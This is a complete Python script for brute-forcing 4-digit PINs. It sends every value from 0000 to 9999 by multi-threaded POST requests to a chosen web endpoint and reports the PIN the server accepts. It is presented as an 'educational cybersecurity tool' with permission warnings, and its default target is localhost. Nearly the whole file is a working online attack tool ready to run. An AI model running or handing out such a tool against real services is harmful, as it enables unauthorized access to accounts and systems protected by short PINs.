#!/usr/bin/env python3
"""
Advanced Multi-threaded PIN Brute Force Cracker
Educational Cybersecurity Tool

This script demonstrates advanced brute-forcing techniques including:
- Multi-threading for performance optimization
- Queue-based task distribution
- Error handling and timeout management
- Progress tracking and logging
- Configurable parameters

USE RESPONSIBLY - FOR EDUCATIONAL PURPOSES ONLY
"""

import requests
import threading
import time
import sys
import os
from queue import Queue, Empty
from datetime import datetime
import argparse

class PINBruteForcer:
    def __init__(self, target_url, threads=10, delay=0, timeout=5, verbose=False):
        self.target_url = target_url
        self.threads = threads
        self.delay = delay  # Delay between requests (anti-rate limiting)
        self.timeout = timeout
        self.verbose = verbose
        
        # Thread-safe variables
        self.found = False
        self.found_pin = None
        self.attempts = 0
        self.queue = Queue()
        self.lock = threading.Lock()
        self.start_time = None
        
        # Session for connection reuse
        self.session = requests.Session()
        
        print(f"🎯 PIN Brute Forcer Initialized")
        print(f"   Target: {self.target_url}")
        print(f"   Threads: {self.threads}")
        print(f"   Delay: {self.delay}s")
        print(f"   Timeout: {self.timeout}s")
        print("="*50)

    def fill_queue(self):
        """Fill the queue with all possible 4-digit PINs (0000-9999)"""
        print("📋 Generating PIN list (0000-9999)...")
        for i in range(10000):
            self.queue.put(f"{i:04d}")
        print(f"✅ Generated {self.queue.qsize()} PINs to test")

    def crack_worker(self, worker_id):
        """Worker thread function for cracking PINs"""
        while not self.found and not self.queue.empty():
            try:
                # Get PIN from queue with timeout
                pin = self.queue.get(timeout=1)
                
                # Add delay if specified (for rate limiting)
                if self.delay > 0:
                    time.sleep(self.delay)
                
                # Attempt to crack this PIN
                success = self.test_pin(pin, worker_id)
                
                # Update attempt counter
                with self.lock:
                    self.attempts += 1
                    
                    # Progress reporting every 100 attempts
                    if self.attempts % 100 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed
                        remaining = self.queue.qsize()
                        eta = remaining / rate if rate > 0 else 0
                        print(f"⏳ Progress: {self.attempts}/10000 attempts "
                              f"({self.attempts/100:.1f}%) | "
                              f"Rate: {rate:.1f}/s | "
                              f"ETA: {eta:.1f}s")
                
                if success:
                    with self.lock:
                        if not self.found:  # Double-check to avoid race condition
                            self.found = True
                            self.found_pin = pin
                            print(f"\n🎉 SUCCESS! PIN FOUND: {pin}")
                            print(f"⏱️  Found in {self.attempts} attempts")
                            print(f"🕐 Time elapsed: {time.time() - self.start_time:.2f} seconds")
                    break
                
                # Mark task as done
                self.queue.task_done()
                
            except Empty:
                # Queue is empty, exit
                break
            except Exception as e:
                if self.verbose:
                    print(f"❌ Worker {worker_id} error: {str(e)}")
                continue

    def test_pin(self, pin, worker_id):
        """Test a single PIN against the target"""
        try:
            response = self.session.post(
                self.target_url,
                data={'pin': pin},
                timeout=self.timeout
            )
            
            # Check for success indicators
            if response.status_code == 200:
                response_data = response.json()
                if response_data.get('result') == 'correct':
                    return True
            
            if self.verbose:
                print(f"🔍 Worker {worker_id}: Tried {pin} - Status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            if self.verbose:
                print(f"⏰ Worker {worker_id}: Timeout for PIN {pin}")
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"🌐 Worker {worker_id}: Network error for PIN {pin}: {str(e)}")
        except Exception as e:
            if self.verbose:
                print(f"❌ Worker {worker_id}: Unexpected error for PIN {pin}: {str(e)}")
        
        return False

    def start_attack(self):
        """Start the multi-threaded brute force attack"""
        print(f"\n🚀 Starting brute force attack with {self.threads} threads...")
        self.start_time = time.time()
        
        # Fill the queue with PINs
        self.fill_queue()
        
        # Create and start worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.crack_worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        print(f"⚡ {len(threads)} worker threads started")
        
        try:
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n\n⚠️  Attack interrupted by user")
            self.found = True  # Stop all threads
            return False
        
        # Final results
        elapsed_time = time.time() - self.start_time
        
        if self.found and self.found_pin:
            print(f"\n✅ ATTACK SUCCESSFUL!")
            print(f"🔑 Cracked PIN: {self.found_pin}")
            print(f"📊 Total attempts: {self.attempts}")
            print(f"⏱️  Total time: {elapsed_time:.2f} seconds")
            print(f"📈 Average rate: {self.attempts/elapsed_time:.2f} attempts/second")
            return True
        else:
            print(f"\n❌ ATTACK FAILED")
            print(f"📊 Total attempts: {self.attempts}")
            print(f"⏱️  Total time: {elapsed_time:.2f} seconds")
            print("🤔 The PIN might not be in the 0000-9999 range, or the target is unreachable")
            return False

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Multi-threaded PIN Brute Force Cracker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pin_cracker.py --url http://localhost:5000/check
  python pin_cracker.py --url http://localhost:5000/check --threads 20 --delay 0.1 --verbose
  python pin_cracker.py --url https://your-app.replit.app/check --threads 5
        """
    )
    
    parser.add_argument('--url', 
                        default='http://localhost:5000/check',
                        help='Target URL for PIN checking (default: http://localhost:5000/check)')
    
    parser.add_argument('--threads', '-t',
                        type=int, default=10,
                        help='Number of threads to use (default: 10)')
    
    parser.add_argument('--delay', '-d',
                        type=float, default=0,
                        help='Delay between requests in seconds (default: 0)')
    
    parser.add_argument('--timeout',
                        type=int, default=5,
                        help='Request timeout in seconds (default: 5)')
    
    parser.add_argument('--verbose', '-v',
                        action='store_true',
                        help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Display warning
    print("⚠️  EDUCATIONAL CYBERSECURITY TOOL")
    print("⚠️  USE RESPONSIBLY AND ONLY ON SYSTEMS YOU OWN OR HAVE PERMISSION TO TEST")
    print("⚠️  UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL")
    print()
    
    # Confirm target
    print(f"Target URL: {args.url}")
    response = input("Continue? (y/N): ")
    if response.lower() != 'y':
        print("Attack cancelled.")
        return
    
    # Initialize and start the brute forcer
    cracker = PINBruteForcer(
        target_url=args.url,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    success = cracker.start_attack()
    
    # Exit code for automation
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
